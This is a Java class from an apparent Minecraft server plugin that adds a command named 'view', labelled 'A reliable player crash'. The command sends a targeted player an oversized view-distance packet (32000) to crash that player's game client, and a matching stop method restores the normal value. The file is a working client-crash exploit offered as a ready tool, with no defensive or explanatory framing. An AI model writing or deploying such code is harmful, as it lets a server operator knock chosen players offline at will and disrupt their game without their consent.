package me.trouper.sentinel.server.commands.extras;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerUpdateViewDistance;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class ViewDistanceCrash extends AbstractExtra {
    
    public ViewDistanceCrash() {
        super("view","A reliable player crash");
    }
    
    @Override
    public void execute(CommandSender sender, Player target) {
        var player = PacketEvents.getAPI().getPlayerManager().getUser(target);
        player.sendPacket(new WrapperPlayServerUpdateViewDistance(32000));
        successAny(sender,"Crashing {0}.",target.getName());
    }

    @Override
    public void stop(CommandSender sender, Player target) {
        var player = PacketEvents.getAPI().getPlayerManager().getUser(target);
        player.sendPacket(new WrapperPlayServerUpdateViewDistance(Bukkit.getViewDistance()));
        successAny(sender,"Attempting to save {0}.",target.getName());
    }
}
